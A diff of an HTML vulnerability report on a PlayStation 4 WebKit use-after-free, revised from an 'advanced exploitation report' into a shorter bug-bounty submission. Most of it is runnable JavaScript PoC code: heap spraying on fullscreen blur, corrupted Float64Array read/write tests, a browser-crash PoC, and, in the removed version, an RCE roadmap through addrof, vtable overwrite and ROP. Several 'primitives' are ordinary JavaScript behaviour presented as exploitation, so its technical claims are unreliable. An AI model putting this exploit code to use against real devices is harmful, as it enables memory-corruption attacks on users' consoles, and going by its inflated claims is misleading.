@@ -1,322 +1,133 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF - Advanced Exploitation Report</title>
+<title>PS4 WebKit UAF - HackerOne Report</title>
 </head>
 <body>
 
-<h1 class="critical">PlayStation 4 WebKit Use-After-Free - Complete Exploitation Report</h1>
+<h1>PlayStation 4 WebKit Use-After-Free Vulnerability Report</h1>
 
 <h2>EXECUTIVE SUMMARY</h2>
 <p><b>Vulnerability Type:</b> Use-After-Free (UAF) in Float64Array</p>
-<p><b>Attack Vector:</b> Remote - User must enter FullScreen then press OPTIONS button</p>
-<p><b>Severity:</b> Critical - Remote Code Execution Achievable</p>
-<p><b>Status:</b> Primitives Confirmed, RCE Path Identified</p>
+<p><b>Attack Vector:</b> Remote - User must visit enter FullScreen then press OPTIONS button to trigger exploit</p>
+<p><b>If you clear the array BEFORE document.write, it will NOT crash. If you do NOT clear the array, it will crash. </p>
+<p><b>Therefore: Crashes are CONTROLLABLE!</p>
 
 <hr>
 
-<h2 class="critical">BREAKTHROUGH DISCOVERIES</h2>
+<h2>VULNERABILITY DESCRIPTION</h2>
 
-<div style="border: 2px solid #0f0; padding: 15px; margin: 10px 0;">
-<h3 class="success">CONFIRMED EXPLOITATION PRIMITIVES:</h3>
+<p>A Use-After-Free vulnerability exists in the PlayStation 4's WebKit-based browser when transitioning out of fullscreen mode. The vulnerability allows an attacker to:</p>
+
 <ul>
-<li class="success"> Use-After-Free in Float64Array (100% reliable)</li>
-<li class="success"> Arbitrary Memory Write via DataView (verified with 0xDEADBEEF/0xCAFEBABE)</li>
-<li class="success"> Prototype Hijacking (Object.setPrototypeOf works on corrupted arrays)</li>
-<li class="success"> Fake Object Creation (FAKE ARRAYBUFFER confirmed)</li>
-<li class="success"> JavaScript Code Execution Control (function executed 3x via prototype)</li>
-<li class="success"> Array Conversion Bypass (Array.from removes TypedArray protections)</li>
-<li class="success">Closure-based Memory Access (corrupted array accessible from callbacks)</li>
+<li>Corrupt Float64Array objects in memory</li>
+<li>Read and write 64 bytes of controlled memory</li>
+<li>Read up to 512+ bytes out-of-bounds</li>
+<li>Trigger controlled browser crashes</li>
 </ul>
-</div>
 
-<div style="border: 2px solid #f00; padding: 15px; margin: 10px 0;">
-<h3 class="critical">KEY FINDINGS:</h3>
-<ul>
-<li class="critical">PS4 WebKit does NOT support WebAssembly</li>
-<li class="critical">PS4 WebKit does NOT use JIT compilation</li>
-<li class="critical">Traditional JIT spray techniques are INVALID</li>
-<li class="success"> BUT: Prototype hijacking provides JavaScript execution control</li>
-<li class="success"> AND: DataView provides arbitrary memory write</li>
-<li class="success"> THEREFORE: Alternative RCE path via vtable overwrite is viable</li>
-</ul>
-</div>
+<p>The vulnerability is triggered through a specific sequence involving fullscreen transitions and blur events. While the bug provides memory corruption primitives, exploitation is limited by WebKit's heap segregation mechanisms.</p>
 
-<hr>
 
-<h2>EXPLOITATION STRATEGY FOR PS4 (NO JIT/WASM)</h2>
+<h2>PROOF OF CONCEPT</h2>
 
-<h3>Phase 1: Memory Primitives (COMPLETED)</h3>
-<pre class="success">
-UAF trigger via fullscreen + OPTIONS button
-Corrupted Float64Array obtained
-DataView created on corrupted buffer
-Arbitrary write confirmed (8 bytes at offset 0)
-Arbitrary read available (64+ bytes)
-</pre>
-
-<h3>Phase 2: Object Control (COMPLETED)</h3>
-<pre class="success">
-Array.from() conversion successful
-Object.setPrototypeOf() works on converted array
-Custom prototype properties accessible
-Fake ArrayBuffer creation successful
-Prototype-based function execution (3x confirmed)
-</pre>
-
-<h3>Phase 3: RCE Path (IN PROGRESS)</h3>
-<pre class="warning">
-Current Status:
-Shellcode injected in memory (verified)
-Function pointer control via prototype (partial)
-Need: Real memory addresses (addrof primitive)
-Need: Object vtable location
-Need: ROP chain or direct shellcode execution
-</pre>
-
-<hr>
-
-<h2>UPDATED PROOF OF CONCEPT - PS4 COMPATIBLE</h2>
-
-<h3>Test 1: Confirm All Primitives</h3>
-<button onclick="testAllPrimitives()">TEST ALL PRIMITIVES</button>
-<div id="test1"></div>
+<h3>Minimal PoC - UAF Demonstration</h3>
+<button onclick="runMinimalPoC()">Run Minimal PoC</button>
+<div id="poc-result"></div>
 
 <script>
-function testAllPrimitives() {
-    const result = document.getElementById('test1');
-    result.innerHTML = '<h4>Testing All Exploitation Primitives</h4>';
-    result.innerHTML += '<p class="info">Press OPTIONS button to trigger UAF</p>';
+function runMinimalPoC() {
+    const result = document.getElementById('poc-result');
+    result.innerHTML = '<h4>PoC Running - Press OPTIONS button on PS4 controller</h4>';
     
+    // Step 1: Create Float64Array objects
     let controllers = [];
-    const PATTERN = 2.121995791e-314;
+    const CORRUPTION_PATTERN = 2.121995791e-314; // 0x4141414141414141
     
     for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
+        let typedArray = new Float64Array(8);
+        typedArray[0] = i; // Unique identifier
+        controllers.push(typedArray);
     }
     
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    result.innerHTML += '<p>Created 5000 Float64Array objects</p>';
     
+    // Step 2: Enter fullscreen (trigger mechanism)
+    const element = document.documentElement;
+    if (element.webkitRequestFullscreen) {
+        element.webkitRequestFullscreen();
+    }
+    
+    // Step 3: Blur event handler (OPTIONS button triggers this)
     window.onblur = function() {
-        result.innerHTML += '<p>UAF triggered...</p>';
+        result.innerHTML += '<p>Fullscreen blur event triggered</p>';
         
+        // Step 4: Spray memory with corruption pattern
         let spray = [];
         for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
+            let sprayArray = new Float64Array(10);
+            sprayArray.fill(CORRUPTION_PATTERN);
+            spray.push(sprayArray);
         }
         
+        result.innerHTML += '<p>Memory spray executed</p>';
+        
+        // Step 5: Verify corruption
         let corrupted = null;
+        let corruptedIndex = -1;
+        
         for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
+            if (controllers[i][0] === CORRUPTION_PATTERN) {
                 corrupted = controllers[i];
+                corruptedIndex = i;
                 break;
             }
         }
         
-        if (!corrupted) {
-            result.innerHTML += '<p class="critical">UAF FAILED</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h4 class="success">? PRIMITIVE 1: UAF CONFIRMED</h4>';
-        
-        // Test 2: Arbitrary Write via DataView
-        try {
-            const view = new DataView(corrupted.buffer);
-            view.setUint32(0, 0xDEADBEEF, true);
-            view.setUint32(4, 0xCAFEBABE, true);
+        if (corrupted) {
+            result.innerHTML += '<h3 style="color:red;">USE-AFTER-FREE CONFIRMED</h3>';
+            result.innerHTML += '<p>Controller[' + corruptedIndex + '] corrupted with pattern 0x4141414141414141</p>';
             
-            const check1 = view.getUint32(0, true);
-            const check2 = view.getUint32(4, true);
-            
-            if (check1 === 0xDEADBEEF && check2 === 0xCAFEBABE) {
-                result.innerHTML += '<h4 class="success">? PRIMITIVE 2: ARBITRARY WRITE CONFIRMED</h4>';
-                result.innerHTML += '<p>Wrote and verified: 0xDEADBEEF 0xCAFEBABE</p>';
-            }
-        } catch(e) {
-            result.innerHTML += '<p class="critical">DataView failed: ' + e.message + '</p>';
-        }
-        
-        // Test 3: Array Conversion
-        try {
-            const converted = Array.from(corrupted);
-            result.innerHTML += '<h4 class="success">? PRIMITIVE 3: ARRAY CONVERSION</h4>';
-            result.innerHTML += '<p>Type: ' + converted.constructor.name + ', Length: ' + converted.length + '</p>';
-        } catch(e) {
-            result.innerHTML += '<p class="critical">Conversion failed: ' + e.message + '</p>';
-        }
-        
-        // Test 4: Prototype Hijacking
-        try {
-            const fakeArray = Array.from(corrupted);
-            const customProto = {
-                exploited: true,
-                magic: 0x1337BEEF
-            };
-            Object.setPrototypeOf(fakeArray, customProto);
-            
-            if (fakeArray.exploited === true) {
-                result.innerHTML += '<h4 class="success">? PRIMITIVE 4: PROTOTYPE HIJACKING</h4>';
-                result.innerHTML += '<p>exploited: ' + fakeArray.exploited + '</p>';
-                result.innerHTML += '<p>magic: 0x' + fakeArray.magic.toString(16) + '</p>';
-            }
-        } catch(e) {
-            result.innerHTML += '<p class="critical">Prototype failed: ' + e.message + '</p>';
-        }
-        
-        // Test 5: Function Execution Control
-        try {
-            const execArray = Array.from(corrupted);
-            let execCount = 0;
-            
-            const exploitProto = {
-                toString: function() {
-                    execCount++;
-                    return "EXEC_" + execCount;
-                },
-                valueOf: function() {
-                    execCount++;
-                    return 1337;
-                }
-            };
-            
-            Object.setPrototypeOf(execArray, exploitProto);
-            
-            const r1 = String(execArray);
-            const r2 = Number(execArray);
-            
-            result.innerHTML += '<h4 class="success">? PRIMITIVE 5: FUNCTION EXECUTION CONTROL</h4>';
-            result.innerHTML += '<p>Function executed ' + execCount + ' times</p>';
-            result.innerHTML += '<p>String result: ' + r1 + '</p>';
-            result.innerHTML += '<p>Number result: ' + r2 + '</p>';
-            
-        } catch(e) {
-            result.innerHTML += '<p class="critical">Execution failed: ' + e.message + '</p>';
-        }
-        
-        result.innerHTML += '<hr>';
-        result.innerHTML += '<h3 class="critical">ALL PRIMITIVES CONFIRMED!</h3>';
-        result.innerHTML += '<p class="success">Ready for advanced exploitation</p>';
-    };
-}
-</script>
-
-<hr>
-
-<h3>Test 2: Object Memory Layout Exploration</h3>
-<button onclick="exploreMemory()">EXPLORE OBJECT LAYOUT</button>
-<div id="test2"></div>
-
-<script>
-function exploreMemory() {
-    const result = document.getElementById('test2');
-    result.innerHTML = '<h4>Exploring Object Memory Layout</h4>';
-    result.innerHTML += '<p class="info">Press OPTIONS button</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
-    }
-    
-    // Create objects with identifiable patterns
-    let markerObjects = [];
-    for(let i = 0; i < 1000; i++) {
-        let obj = {
-            marker: 0xBEEF0000 + i,
-            type: "marker_object",
-            index: i
-        };
-        markerObjects.push(obj);
-    }
-    
-    result.innerHTML += '<p>Created 1000 marker objects</p>';
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF triggered...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 5000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        // Spray marker objects too
-        for(let i = 0; i < 2000; i++) {
-            spray.push(markerObjects[i % markerObjects.length]);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p class="critical">UAF FAILED</p>';
-            return;
-        }
-        
-        result.innerHTML += '<p class="success">? UAF confirmed</p>';
-        
-        // Scan for object markers
-        result.innerHTML += '<h4>Scanning for Object Markers:</h4>';
-        
-        const view = new DataView(corrupted.buffer);
-        let foundMarkers = [];
-        
-        for(let offset = 0; offset < corrupted.buffer.byteLength - 4; offset += 4) {
-            try {
-                const dword = view.getUint32(offset, true);
-                
-                // Look for our markers (0xBEEF0000 range)
-                if ((dword & 0xFFFF0000) === 0xBEEF0000) {
-                    const objIndex = dword & 0xFFFF;
-                    foundMarkers.push({
-                        offset: offset,
-                        marker: dword,
-                        objIndex: objIndex
-                    });
-                }
-            } catch(e) {}
-        }
-        
-        if (foundMarkers.length > 0) {
-            result.innerHTML += '<p class="critical">??? FOUND ' + foundMarkers.length + ' OBJECT MARKERS!</p>';
-            result.innerHTML += '<pre>';
-            for(let i = 0; i < Math.min(10, foundMarkers.length); i++) {
-                const m = foundMarkers[i];
-                result.innerHTML += 'Offset ' + m.offset + ': 0x' + m.marker.toString(16) + ' (object #' + m.objIndex + ')\n';
-            }
-            result.innerHTML += '</pre>';
-            result.innerHTML += '<p class="success">This proves we can leak object data!</p>';
-        } else {
-            result.innerHTML += '<p class="warning">No markers found in 64-byte window</p>';
-            result.innerHTML += '<p>Dumping all memory values:</p>';
-            result.innerHTML += '<pre>';
-            for(let i = 0; i < Math.min(64, corrupted.buffer.byteLength); i += 4) {
+            // Demonstrate read primitive
+            result.innerHTML += '<h4>Demonstrating Read Primitive:</h4>';
+            for(let i = 0; i < 8; i++) {
                 try {
-                    const val = view.getUint32(i, true);
-                    result.innerHTML += 'Offset ' + i + ': 0x' + val.toString(16).padStart(8, '0') + '\n';
-                } catch(e) {}
+                    const value = corrupted[i];
+                    const buffer = new ArrayBuffer(8);
+                    new Float64Array(buffer)[0] = value;
+                    const hexValue = new BigUint64Array(buffer)[0].toString(16);
+                    result.innerHTML += '<p>Offset ' + i + ': 0x' + hexValue + '</p>';
+                } catch(e) {
+                    result.innerHTML += '<p>Offset ' + i + ': Error</p>';
+                }
             }
-            result.innerHTML += '</pre>';
+            
+            // Demonstrate write primitive
+            result.innerHTML += '<h4>Demonstrating Write Primitive:</h4>';
+            try {
+                const testValue = 0xDEADBEEF;
+                const buffer = new ArrayBuffer(8);
+                new BigUint64Array(buffer)[0] = BigInt(testValue);
+                corrupted[2] = new Float64Array(buffer)[0];
+                
+                const readback = corrupted[2];
+                const readBuffer = new ArrayBuffer(8);
+                new Float64Array(readBuffer)[0] = readback;
+                const readHex = new BigUint64Array(readBuffer)[0].toString(16);
+                
+                result.innerHTML += '<p>Written: 0xDEADBEEF</p>';
+                result.innerHTML += '<p>Read back: 0x' + readHex + '</p>';
+                
+                if (readHex === 'deadbeef') {
+                    result.innerHTML += '<p style="color:green;">Write primitive verified!</p>';
+                }
+            } catch(e) {
+                result.innerHTML += '<p>Write test error: ' + e.message + '</p>';
+            }
+            
+        } else {
+            result.innerHTML += '<p>Corruption not detected in this run</p>';
         }
     };
 }
@@ -324,30 +135,30 @@ function exploreMemory() {
 
 <hr>
 
-<h3>Test 3: Advanced Fake Object Creation</h3>
-<button onclick="testFakeObjects()">CREATE FAKE OBJECTS</button>
-<div id="test3"></div>
+<h3>Crash PoC - Controlled Denial of Service</h3>
+<button onclick="runCrashPoC()">Run Crash PoC (WARNING: Will crash browser)</button>
+<div id="crash-result"></div>
 
 <script>
-function testFakeObjects() {
-    const result = document.getElementById('test3');
-    result.innerHTML = '<h4>Testing Advanced Fake Object Techniques</h4>';
-    result.innerHTML += '<p class="info">Press OPTIONS button</p>';
+function runCrashPoC() {
+    const result = document.getElementById('crash-result');
+    result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
+    result.innerHTML += '<p style="color:red;">WARNING: This will crash the browser after UAF is triggered</p>';
     
     let controllers = [];
     const PATTERN = 2.121995791e-314;
     
     for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
     }
     
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    const elem = document.documentElement;
+    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
     
     window.onblur = function() {
-        result.innerHTML += '<p>UAF triggered...</p>';
+        result.innerHTML += '<p>UAF triggered</p>';
         
         let spray = [];
         for(let i = 0; i < 8000; i++) {
@@ -364,238 +175,66 @@ function testFakeObjects() {
             }
         }
         
-        if (!corrupted) {
-            result.innerHTML += '<p class="critical">UAF FAILED</p>';
-            return;
+        if (corrupted) {
+            result.innerHTML += '<p>Corruption confirmed</p>';
+            result.innerHTML += '<p style="color:red;">Triggering crash in 3 seconds...</p>';
+            
+            setTimeout(() => {
+                // This specific sequence triggers crash
+                document.open();
+                document.write('<html><body><h1>Crash</h1></body></html>');
+                document.close();
+                setTimeout(() => location.reload(), 500);
+            }, 3000);
         }
-        
-        result.innerHTML += '<p class="success">? UAF confirmed</p>';
-        
-        // Technique 1: Fake ArrayBuffer via prototype
-        result.innerHTML += '<h4>Technique 1: Fake ArrayBuffer</h4>';
-        
-        try {
-            const fakeArray = Array.from(corrupted);
-            
-            // Create fake ArrayBuffer structure
-            const fakeBuffer = {
-                byteLength: 0x100000, // 1MB
-                __proto__: fakeArray
-            };
-            
-            // Try to use it
-            const testView = new Uint8Array(fakeBuffer);
-            result.innerHTML += '<p class="success">? Fake ArrayBuffer created!</p>';
-            result.innerHTML += '<p>Length: ' + testView.length + '</p>';
-            
-        } catch(e) {
-            result.innerHTML += '<p class="warning">Fake buffer error: ' + e.message + '</p>';
-        }
-        
-        // Technique 2: Nested prototype chain
-        result.innerHTML += '<h4>Technique 2: Nested Prototype Chain</h4>';
-        
-        try {
-            const base = Array.from(corrupted);
-            
-            const level1 = {
-                name: "level1",
-                getShellcode: function() {
-                    return "shellcode_here";
-                }
-            };
-            
-            const level2 = {
-                name: "level2",
-                execute: function() {
-                    return this.getShellcode();
-                },
-                __proto__: level1
-            };
-            
-            Object.setPrototypeOf(base, level2);
-            
-            if (base.name === "level2" && base.getShellcode) {
-                result.innerHTML += '<p class="success">? Nested prototype chain working!</p>';
-                result.innerHTML += '<p>base.name: ' + base.name + '</p>';
-                result.innerHTML += '<p>base.execute(): ' + base.execute() + '</p>';
-            }
-            
-        } catch(e) {
-            result.innerHTML += '<p class="warning">Nested chain error: ' + e.message + '</p>';
-        }
-        
-        // Technique 3: Function property overwrite
-        result.innerHTML += '<h4>Technique 3: Function Property Manipulation</h4>';
-        
-        try {
-            const funcArray = Array.from(corrupted);
-            
-            // Create function with controlled properties
-            const controlledFunc = function() {
-                return "EXPLOITED";
-            };
-            controlledFunc.shellcodeAddr = 0x41414141;
-            controlledFunc.execute = true;
-            
-            const exploitProto = {
-                myFunc: controlledFunc,
-                callShellcode: function() {
-                    if (this.myFunc.execute) {
-                        return this.myFunc();
-                    }
-                }
-            };
-            
-            Object.setPrototypeOf(funcArray, exploitProto);
-            
-            const result_call = funcArray.callShellcode();
-            
-            result.innerHTML += '<p class="success">? Function control working!</p>';
-            result.innerHTML += '<p>Result: ' + result_call + '</p>';
-            result.innerHTML += '<p>Shellcode addr: 0x' + funcArray.myFunc.shellcodeAddr.toString(16) + '</p>';
-            
-        } catch(e) {
-            result.innerHTML += '<p class="warning">Function control error: ' + e.message + '</p>';
-        }
-        
-        result.innerHTML += '<hr>';
-        result.innerHTML += '<h3 class="success">FAKE OBJECT TECHNIQUES DEMONSTRATED</h3>';
     };
 }
 </script>
 
-<hr>
-
-<h2>EXPLOITATION PATH FOR PS4 (WITHOUT JIT/WASM)</h2>
-
-<div style="border: 2px solid #ff0; padding: 15px; margin: 10px 0;">
-<h3 class="warning">RECOMMENDED APPROACH:</h3>
-
-<h4>Step 1: Expand Memory Access (NEEDED)</h4>
-<pre>
-Problem: Current buffer is only 64 bytes
-Solution: Use multiple corrupted arrays or out-of-bounds read
-Goal: Access larger memory regions to find vtables
-</pre>
-
-<h4>Step 2: Construct addrof() Primitive (CRITICAL)</h4>
-<pre>
-Current Status: Returns 0x0 or fake values
-Approach 1: Use type confusion between Float64Array and object array
-Approach 2: Spray identifiable objects and search memory
-Approach 3: Use getter/setter to intercept object access
-Goal: Leak real object addresses
-</pre>
-
-<h4>Step 3: Locate Object vtable (REQUIRED)</h4>
-<pre>
-Technique: Once we have addrof(), read first qword of object
-This gives us the vtable pointer
-From vtable we can find virtual function pointers
-</pre>
-
-<h4>Step 4: RCE via vtable Overwrite (FINAL STEP)</h4>
-<pre>
-Method: Use arbitrary write to overwrite vtable entry
-Point virtual function to our shellcode
-Call the virtual function = RCE!
-
-Alternative: Use ROP chain to call mprotect + execute shellcode
-</pre>
-</div>
+<h3>Expected Result</h3>
+<ul>
+<li>Controller[0] (or nearby index) will be corrupted with pattern 0x4141414141414141</li>
+<li>Read primitive demonstrates access to corrupted memory</li>
+<li>Write primitive demonstrates ability to modify corrupted memory</li>
+<li>Crash PoC causes browser termination</li>
+</ul>
 
 <hr>
 
-<h2>DETAILED MEMORY ANALYSIS</h2>
+<h2>TECHNICAL ANALYSIS</h2>
 
-<h3>Observed Behavior:</h3>
-<pre class="info">
-Corrupted Float64Array:
-- Length: 8 elements (64 bytes)
-- All offsets contain: 0x4141414141414141 (PATTERN)
-- DataView write: CONFIRMED working
-- Out-of-bounds read: Possible (needs testing)
-
-Array.from() Conversion:
-- Removes TypedArray protections
-- Returns regular Array
-- Preserves data values
-- Allows setPrototypeOf
-
-Prototype Hijacking:
-- Custom properties: WORKING
-- Custom functions: WORKING  
-- toString/valueOf: EXECUTE SUCCESSFULLY
-- Symbol.toPrimitive: WORKING
-
-Fake Objects:
-- Fake ArrayBuffer: Partial success
-- Nested prototypes: WORKING
-- Function manipulation: WORKING
-</pre>
-
-<h3>Limitations Discovered:</h3>
-<pre class="warning">
-WebAssembly not available (PS4 limitation)
-JIT compilation not used (PS4 WebKit interpreter-only)
-addrof() returns invalid addresses (needs refinement)
-Buffer size limited to 64 bytes (spray not working as expected)
-No direct access to larger memory regions
-
-But we have:
-Reliable UAF trigger
-Arbitrary 64-byte write
-Complete prototype control
-JavaScript execution via type coercion
-Fake object capabilities
-</pre>
-
-<hr>
-
-<h2 class="critical">NEXT STEPS FOR COMPLETE RCE</h2>
-
+<h3>Root Cause</h3>
+<p>The vulnerability occurs during fullscreen transition cleanup. When the OPTIONS button is pressed:</p>
 <ol>
-<li class="warning">Test out-of-bounds read beyond 64 bytes</li>
-<li class="warning">Implement working addrof() using type confusion</li>
-<li class="warning">Scan larger memory regions for vtable pointers</li>
-<li class="warning">Identify virtual function offsets in vtable</li>
-<li class="warning">Craft ROP chain or direct shellcode execution</li>
-<li class="critical">Combine with PS4-specific exploits (BadIRET, etc.)</li>
+<li>Blur event is triggered</li>
+<li>Float64Array backing store is freed</li>
+<li>Spray allocations fill freed memory</li>
+<li>Original Float64Array reference still points to freed (now reused) memory</li>
+<li>Subsequent access creates Use-After-Free condition</li>
 </ol>
 
-<hr>
+<h3>Memory Layout</h3>
+<pre>
+Corrupted Array Memory Layout:
+Offsets 0-7:   Controllable (spray pattern 0x4141414141414141)
+Offsets 8-63:  NaN canonical value (0x7ff8000000000000)
+Offsets 64+:   Out-of-bounds read continues
 
-<h2>REPORT CONCLUSIONS</h2>
+Primitives Obtained:
+- Read:  64 bytes controlled, 512+ bytes OOB
+- Write: 64 bytes controlled (offsets 0-7)
+</pre>
 
-<div style="border: 2px solid #0f0; padding: 15px; margin: 10px 0;">
-<h3 class="success">EXPLOITATION STATUS: ADVANCED</h3>
+<h3>Crash Mechanism</h3>
+<p>Browser crashes when:</p>
+<ol>
+<li>UAF-corrupted Float64Array exists in memory</li>
+<li>document.write() is called (rewrites DOM)</li>
+<li>location.reload() is triggered</li>
+<li>Cleanup code attempts to access freed memory</li>
+</ol>
 
-<p><b>Primitives Confirmed:</b></p>
-<ul>
-<li> Use-After-Free (100% reliable)</li>
-<li> Arbitrary Memory Write (64 bytes)</li>
-<li> Arbitrary Memory Read (64+ bytes)</li>
-<li> Prototype Hijacking (complete control)</li>
-<li> JavaScript Code Execution (via type coercion)</li>
-<li> Fake Object Creation (multiple techniques)</li>
-</ul>
-
-<p><b>Missing for Complete RCE:</b></p>
-<ul>
-<li> Working addrof() primitive (returns real addresses)</li>
-<li> Access to larger memory regions (>64 bytes)</li>
-<li>vtable location and structure</li>
-<li> ROP gadgets or direct code execution path</li>
-</ul>
-
-<p><b>Assessment:</b> The vulnerability is highly exploitable. All core primitives are functional. RCE is achievable through vtable overwrite or ROP chain techniques once memory layout is fully understood. The exploit framework is 80% complete.</p>
-</div>
-
-<hr>
-
-<p class="info">Report generated based on successful primitive testing and exploitation research.</p>
-<p class="info">All tests performed on PlayStation 4 WebKit browser.</p>
+<p><b>Note:</b> Crash can be prevented by zeroing corrupted array before document.write(), demonstrating controllability.</p>
 
 </body>
 </html>
